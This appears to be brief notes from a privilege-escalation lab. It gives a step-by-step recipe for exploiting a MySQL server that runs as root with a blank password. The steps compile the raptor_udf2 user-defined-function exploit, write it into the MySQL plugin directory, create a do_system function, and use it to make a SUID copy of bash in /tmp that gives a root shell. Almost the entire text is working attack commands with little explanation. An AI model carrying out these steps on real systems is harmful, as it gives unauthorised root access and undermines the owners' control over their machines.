

# sql exploite
---

- **Change into the MySQL directory:**

    ```bash
    cd /home/user/tools/mysql-udf
    ```

---

- **Compile the `raptor_udf2.c` exploit code:**

    ```bash
    gcc -g -c raptor_udf2.c -fPIC
    gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
    ```

---

- **Connect to the MySQL service as the root user with a blank password:**

    ```bash
    mysql -u root
    ```

---

- **In the MySQL shell, create a User Defined Function (UDF) "do_system" using the compiled exploit:**

    ```sql
    use mysql;
    create table foo(line blob);
    insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
    select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
    create function do_system returns integer soname 'raptor_udf2.so';
    ```

---

- **Use the function to copy `/bin/bash` to `/tmp/rootbash` and set the SUID permission:**

    ```sql
    select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
    ```

---

- **Exit from the MySQL shell:**

    ```bash
    exit
    ```

---

- **Run the `/tmp/rootbash` executable with `-p` to gain a shell running with root privileges:**

    ```bash
    /tmp/rootbash -p
    ```

---

- **If you want to exit from root:**

    ```bash
    rm /tmp/rootbash
    exit
    ```

---

